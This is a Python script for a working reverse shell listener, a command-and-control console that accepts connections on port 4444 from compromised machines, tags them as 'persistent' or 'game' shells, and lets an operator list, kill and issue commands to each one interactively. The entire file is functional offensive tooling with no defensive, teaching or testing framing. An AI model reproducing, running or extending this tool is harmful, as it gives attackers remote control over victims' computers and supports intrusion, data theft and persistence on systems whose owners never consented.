import socket
import threading
import os
import sys
import time

HOST = '0.0.0.0'
PORT = 4444

active_shells = []
shell_counter = 0
lock = threading.Lock()

def handle_client(conn, addr, shell_id):
    global active_shells
    
    # Try to identify shell type from first message
    shell_type = "unknown"
    try:
        conn.settimeout(2)
        first_data = conn.recv(1024).decode()
        if "PERSISTENT" in first_data:
            shell_type = "persistent"
        elif "GAME" in first_data:
            shell_type = "game"
    except:
        pass
    
    with lock:
        active_shells.append({
            'id': shell_id,
            'conn': conn,
            'addr': addr,
            'type': shell_type,
            'buffer': '',
            'last_seen': time.time()
        })
    
    print(f"\n[!] SHELL #{shell_id} [{shell_type}] from {addr}")
    
    try:
        conn.settimeout(1.0)
        
        while True:
            try:
                data = conn.recv(65536)
                if not data:
                    break
                
                with lock:
                    for shell in active_shells:
                        if shell['id'] == shell_id:
                            shell['buffer'] += data.decode('utf-8', errors='ignore')
                            shell['last_seen'] = time.time()
                            break
                
            except socket.timeout:
                continue
            except:
                break
                
    except:
        pass
    finally:
        with lock:
            active_shells = [s for s in active_shells if s['id'] != shell_id]
        conn.close()
        print(f"[*] Shell #{shell_id} closed")

def list_shells():
    with lock:
        if not active_shells:
            print("No active shells")
            return
        print("\nActive Shells:")
        for shell in active_shells:
            print(f"  #{shell['id']} [{shell['type']}] - {shell['addr'][0]}:{shell['addr'][1]}")

def send_to_shell(shell_id, command):
    with lock:
        shell = next((s for s in active_shells if s['id'] == shell_id), None)
    
    if not shell:
        return None, "Shell not found"
    
    try:
        shell['buffer'] = ''
        shell['conn'].send((command + "\n").encode())
        time.sleep(2)
        
        response = shell['buffer']
        shell['buffer'] = ''
        
        if not response:
            return None, "No response"
        
        return response, None
    except Exception as e:
        return None, str(e)

def interactive_shell(shell_id):
    print(f"\n[+] Interactive shell #{shell_id}")
    print("[+] Type 'exit' to return\n")
    
    response, error = send_to_shell(shell_id, "echo READY")
    if error:
        print(f"[-] Shell not responding: {error}")
        return
    
    while True:
        try:
            cmd = input(f"shell#{shell_id}> ").strip()
            
            if cmd.lower() in ['exit', 'back']:
                break
            
            if not cmd:
                continue
            
            response, error = send_to_shell(shell_id, cmd)
            
            if error:
                print(f"[-] {error}")
                if "not found" in error:
                    break
            else:
                if response:
                    print(response, end='')
                else:
                    print("[OK]")
                    
        except KeyboardInterrupt:
            print("\n[+] Returning...")
            break

def main_listener():
    global shell_counter
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        print("=" * 70)
        print("🔴 PERSISTENT SHELL LISTENER V5 - TRUE PERSISTENCE")
        print("=" * 70)
        print(f"📡 Listening on: 0.0.0.0:{PORT}")
        print(f"🌐 Your IP: {local_ip}")
        print("\n📋 Commands:")
        print("  list              - Show active shells")
        print("  use <id>          - Interact with shell")
        print("  kill <id>         - Kill shell")
        print("  quit              - Exit")
        print("=" * 70)
        
        def accept_connections():
            global shell_counter
            while True:
                try:
                    conn, addr = server.accept()
                    shell_counter += 1
                    thread = threading.Thread(
                        target=handle_client, 
                        args=(conn, addr, shell_counter),
                        daemon=True
                    )
                    thread.start()
                except:
                    pass
        
        threading.Thread(target=accept_connections, daemon=True).start()
        
        while True:
            try:
                cmd = input("\nlistener> ").strip()
                
                if not cmd:
                    continue
                    
                parts = cmd.split()
                command = parts[0].lower()
                
                if command == 'quit':
                    break
                    
                elif command == 'list':
                    list_shells()
                    
                elif command == 'kill':
                    if len(parts) < 2:
                        print("Usage: kill <id>")
                        continue
                    try:
                        kill_id = int(parts[1])
                        with lock:
                            shell = next((s for s in active_shells if s['id'] == kill_id), None)
                        if shell:
                            shell['conn'].close()
                            print(f"[+] Shell #{kill_id} killed")
                        else:
                            print(f"[-] Shell #{kill_id} not found")
                    except:
                        print("Invalid ID")
                        
                elif command == 'use':
                    if len(parts) < 2:
                        print("Usage: use <id>")
                        continue
                    try:
                        shell_id = int(parts[1])
                        with lock:
                            target = next((s for s in active_shells if s['id'] == shell_id), None)
                        
                        if target:
                            interactive_shell(shell_id)
                        else:
                            print(f"[-] Shell #{shell_id} not found")
                    except:
                        print("Invalid ID")
                        
                else:
                    print("Unknown command")
                    
            except KeyboardInterrupt:
                break
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    main_listener()